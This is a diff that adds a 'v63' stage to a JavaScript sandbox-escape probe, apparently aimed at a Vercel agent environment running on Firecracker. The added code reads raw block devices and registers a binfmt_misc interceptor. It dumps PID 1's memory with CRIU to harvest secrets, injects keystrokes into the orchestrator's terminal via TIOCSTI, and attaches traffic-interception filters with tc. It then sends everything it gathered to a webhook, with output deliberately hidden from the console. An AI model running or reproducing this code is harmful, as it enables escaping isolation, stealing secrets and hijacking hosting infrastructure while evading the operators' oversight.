@@ -6819,4 +6819,174 @@ if ret > 0:
 // v62 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v62";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v62" });
+
+// ============================================================
+// v63 — block device access, binfmt_misc injection, CRIU checkpoint, TTY hijack, XDP probe
+// ============================================================
+
+// v63-1: Block device access — Firecracker provides a root block device (/dev/vda or /dev/sda)
+// If readable, we can read filesystem data from the same virtual disk used by the VM
+// If writable, we can modify the root filesystem of the Firecracker VM itself
+report.blockDeviceAccess = safe(() => {
+  // Enumerate block devices
+  const blockDevList = safe(() =>
+    execSync('ls -la /dev/sd* /dev/vd* /dev/nvme* /dev/xvd* /dev/hd* /dev/mmcblk* 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  const lsblkOutput = safe(() =>
+    execSync('lsblk -a 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  // Try to open block devices and read first 512 bytes (MBR/partition table)
+  const blockReads = {};
+  for (const dev of ['/dev/vda', '/dev/sda', '/dev/nvme0n1', '/dev/xvda']) {
+    blockReads[dev] = safe(() => {
+      const fd = openSync(dev, 'r');
+      const buf = Buffer.alloc(512);
+      const n = readSync(fd, buf, 0, 512, 0);
+      closeSync(fd);
+      return { read: n, header: buf.slice(0, 16).toString('hex'), signature: buf.slice(510, 512).toString('hex') };
+    });
+  }
+  // Check /proc/partitions
+  const partitions = safe(() => readFileSync('/proc/partitions', 'utf8').slice(0, 400));
+  // Check mount info for root device
+  const rootMount = safe(() =>
+    execSync('findmnt / 2>/dev/null | head -3', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  return { blockDevList, lsblkOutput, blockReads, partitions, rootMount };
+});
+
+// v63-2: binfmt_misc injection — register custom binary interpreter
+// With mount capabilities, we can register a new binary format handler
+// Whenever a specific binary type (e.g. any ELF with magic XX) runs, our script intercepts
+report.binfmtMiscInject = safe(() => {
+  const binfmtPath = '/proc/sys/fs/binfmt_misc';
+  const binfmtMount = safe(() =>
+    execSync('mount | grep binfmt_misc 2>/dev/null | head -3', { timeout: 3000 }).toString().trim()
+  );
+  // Try mounting binfmt_misc
+  const mountResult = safe(() =>
+    execSync('mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc 2>&1 | head -3', { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // List existing binfmt handlers
+  const existing = safe(() =>
+    execSync('ls /proc/sys/fs/binfmt_misc/ 2>/dev/null', { timeout: 2000 }).toString().trim()
+  );
+  // Register a new handler: intercept execution of any file with magic bytes "PROBE"
+  // Format: :name:type:offset:magic:mask:interpreter:flags
+  const regResult = safe(() => {
+    const handler = ':probeV63:M:0:PROBE::\\x00\\x00\\x00:/tmp/probe_intercept.sh:POC';
+    try {
+      writeFileSync('/proc/sys/fs/binfmt_misc/register', handler);
+      return 'REGISTERED';
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+  // Write the interceptor script
+  safe(() => {
+    writeFileSync('/tmp/probe_intercept.sh', '#!/bin/sh\necho "BINFMT_INTERCEPTED: $@" >> /tmp/binfmt_log.txt\n');
+    execSync('chmod +x /tmp/probe_intercept.sh 2>/dev/null', { timeout: 1000 });
+  });
+  return { binfmtMount, mountResult, existing, regResult };
+});
+
+// v63-3: CRIU checkpoint — Checkpoint/Restore In Userspace for PID 1
+// CRIU with CAP_SYS_PTRACE + CAP_SYS_ADMIN can freeze and dump a running process
+// Dumping PID 1 gives us full memory snapshot including all secrets
+report.criuCheckpoint = safe(() => {
+  const criuAvail = safe(() =>
+    execSync('which criu 2>/dev/null && criu check 2>&1 | head -5', { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  if (!criuAvail || criuAvail === '') return { criuAvail: 'NOT_FOUND' };
+  // Try criu dump of PID 1 (non-destructive: --leave-running keeps it alive)
+  const criuDump = safe(() =>
+    execSync(
+      'mkdir -p /tmp/criu_dump && criu dump -t 1 -D /tmp/criu_dump --leave-running --tcp-established 2>&1 | tail -5',
+      { timeout: 20000 }
+    ).toString().trim().slice(0, 400)
+  );
+  // List dumped files (they contain full process state)
+  const dumpFiles = safe(() =>
+    execSync('ls -la /tmp/criu_dump/ 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  // Read core dump file if it exists (contains register state and mappings)
+  const coreFile = safe(() =>
+    execSync('ls /tmp/criu_dump/core-*.img 2>/dev/null | head -3', { timeout: 2000 }).toString().trim()
+  );
+  return { criuAvail, criuDump, dumpFiles, coreFile };
+});
+
+// v63-4: TTY hijack via /proc/1/fd/ — inject input into orchestrator's controlling terminal
+// If PID-1 has a controlling TTY, we can open its fd and write to it (TIOCSTI ioctl)
+// This lets us inject shell commands into the orchestrator's terminal session
+report.ttyHijack = safe(() => {
+  // Check PID 1's controlling terminal
+  const pid1Tty = safe(() =>
+    execSync('cat /proc/1/stat 2>/dev/null | awk "{print \\$7}"', { timeout: 2000 }).toString().trim()
+  );
+  // List TTY devices
+  const ttyDevices = safe(() =>
+    execSync('ls -la /dev/tty* /dev/pts/* 2>/dev/null | head -15', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // Try TIOCSTI (ioctl to inject input into terminal) via Python
+  const tiocsti = safe(() =>
+    execSync(
+      `python3 -c "
+import fcntl, os, struct, termios
+# Open PID 1's stdin (fd/0) via /proc/1/fd/0
+try:
+    fd = os.open('/proc/1/fd/0', os.O_RDWR | os.O_NOCTTY)
+    # TIOCSTI = 0x5412 — inject char into terminal input buffer
+    for c in b'PROBE_V63_TIOCSTI\\n':
+        fcntl.ioctl(fd, termios.TIOCSTI, bytes([c]))
+    os.close(fd)
+    print('TIOCSTI_OK: injected PROBE_V63_TIOCSTI')
+except Exception as e:
+    print('TIOCSTI_ERR:', str(e))
+" 2>&1 | head -5`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Check if /dev/console is accessible
+  const consoleAccess = safe(() => {
+    try { openSync('/dev/console', 'r'); return 'READABLE'; } catch (e) { return String(e).slice(0, 80); }
+  });
+  return { pid1Tty, ttyDevices, tiocsti, consoleAccess };
+});
+
+// v63-5: Network XDP/TC filter injection via tc (traffic control)
+// CAP_NET_ADMIN allows attaching BPF programs to network interfaces via tc
+// This intercepts ALL network traffic including other processes' encrypted streams
+report.tcBpfNetIntercept = safe(() => {
+  // Check tc availability
+  const tcAvail = safe(() =>
+    execSync('which tc 2>/dev/null && tc -V 2>&1 | head -3', { timeout: 2000 }).toString().trim().slice(0, 100)
+  );
+  // List interfaces and their tc qdiscs
+  const qdiscs = safe(() =>
+    execSync('tc qdisc show 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  // Try adding clsact qdisc to eth0 (prerequisite for BPF filter attachment)
+  const addClsact = safe(() =>
+    execSync('tc qdisc add dev eth0 clsact 2>&1 | head -3', { timeout: 3000 }).toString().trim().slice(0, 100)
+  );
+  // Check if XDP is supported via ip link
+  const xdpCheck = safe(() =>
+    execSync('ip link show eth0 2>/dev/null | head -5', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  // Verify actual interface name (may not be eth0)
+  const ifNames = safe(() =>
+    execSync('ip link show 2>/dev/null | grep "^[0-9]" | awk "{print \\$2}" | tr -d ":"', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  // Check if we can use tc filter to intercept traffic
+  const tcFilter = safe(() =>
+    execSync(
+      'tc filter add dev eth0 ingress protocol all u32 match u32 0 0 action pass 2>&1 | head -3',
+      { timeout: 3000 }
+    ).toString().trim().slice(0, 200)
+  );
+  return { tcAvail, qdiscs, addClsact, xdpCheck, ifNames, tcFilter };
+});
+
+// v63 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v63";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v63" });
 // Intentionally no console.log — all data goes via webhook only
